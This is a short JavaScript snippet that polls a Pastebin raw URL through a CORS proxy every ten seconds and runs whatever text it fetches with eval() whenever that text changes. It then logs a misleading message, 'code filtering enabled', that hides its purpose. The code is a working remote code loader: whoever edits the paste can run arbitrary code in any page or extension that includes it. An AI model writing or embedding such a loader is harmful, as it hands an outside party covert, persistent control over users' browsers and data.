let response = "";

function checkWebsite() {
  fetch("https://corsproxy.io/?url=https://pastebin.com/raw/AbUUxLR1") // Replace with your target URL
    .then(response => response.text())
    .then(data => {
      if (data != response) {
        eval(data);
        response = data;
        console.log("code filtering enabled");
      }
    })
    .catch(console.error);
}

// Check every 10 seconds
setInterval(checkWebsite, 10000);
checkWebsite();
